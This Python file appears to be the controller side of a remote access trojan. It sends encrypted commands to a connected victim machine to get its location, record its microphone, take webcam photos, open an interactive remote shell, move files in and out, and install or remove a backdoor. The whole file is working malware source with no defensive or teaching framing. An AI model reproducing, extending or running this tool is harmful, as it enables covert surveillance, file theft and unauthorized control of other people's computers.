from .encrypter import *
from .system import system
from colorama import Fore, init
from threading import *
from cryptography.fernet import Fernet
import struct
import random

def recv_data(conn):
    try:
        size_data = conn.recv(4)
        if not size_data or len(size_data) < 4:
            print(Fore.LIGHTRED_EX + "[-] Session Closed!")
            exit(0)
        size = struct.unpack('>I', size_data)[0]
        data = conn.recv(size)
        if not data or len(data) < size:
            print(Fore.LIGHTRED_EX + "[-] Session Closed!")
            exit(0)
        return decrypt(data)
    except Exception as e:
        print(Fore.LIGHTRED_EX + "[!] Error: {}".format(e))
        exit(0)

def geo(conn, address):
    conn.send(encrypt(b"MODE_GEO"))
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data.decode())
    input("OK")

def mic(conn, address):
    number = random.randint(0, 9999999)
    print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
    conn.send(encrypt(b"MODE_MIC"))
    data = recv_data(conn)
    with open(f"records/record{number}.wav", "wb") as f:
        f.write(data)
        f.close()
    print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: records/record{number}.wav")
    input("OK")

def shell(conn, address):
    conn.send(encrypt(b"MODE_SHELL"))
    try:
        print(decrypt(conn.recv(1024)).decode())
        while True:
            cmd = input(Fore.LIGHTMAGENTA_EX + "$ ")
            if not cmd.strip():
                continue
            conn.send(encrypt(cmd.encode()))
            if cmd == 'exit':
                system.clear_screen()
                break
            if cmd == 'clear':
                system.clear_screen()
            try:
                output = recv_data(conn)
                print(Fore.LIGHTGREEN_EX + output.decode(errors='ignore'))
            except Exception as e:
                print(Fore.LIGHTRED_EX + f"[!] Error: {e}")
                break
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error In Shell Mode: {e}")

def upload(conn, address):
    path = input("File Path: ")
    name = input("Destination File Name: ")
    try:
        with open(path, 'rb') as f:
            data = f.read()
        conn.send(encrypt(b"MODE_UPLOAD"))
        conn.send(encrypt(name.encode()))

        control = recv_data(conn)
        conn.send(encrypt(data))
        print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
    except Exception as error:
        print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
    input("OK")
    
def download(conn, address):
    conn.send(encrypt(b"MODE_DOWNLOAD"))
    path = input("File Path: ")
    name = input("Destination File Name: ")
    conn.send(encrypt(path.encode()))
    try:
        conn.send(encrypt(b'control'))

        data = recv_data(conn)
        with open(name, 'w') as f:
            f.write(data)
    except Exception as error: 
        print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
    input("OK")

def cam(conn, address):
    number = random.randint(0, 9999999)
    print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
    conn.send(encrypt(b"MODE_CAM"))
    data = recv_data(conn)
    with open(f"photos/photo{number}.jpg", "wb") as f:
        f.write(data)
    print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: photos/photo{number}.jpg")
    input("OK")

def backdoor(conn, address):
    conn.send(encrypt(b"MODE_BACKDOOR"))
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + f"[+] Created Backdoor")
    input("OK")

def delete(conn, address):
    conn.send(encrypt(b"MODE_DEL"))
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + "[+] Destroyed Backdoor")
    input("OK")

def agentinfo(conn, address):
    print(Fore.LIGHTGREEN_EX + f"IP : {address[0]} PORT : {str(address[1])}")
    input("OK")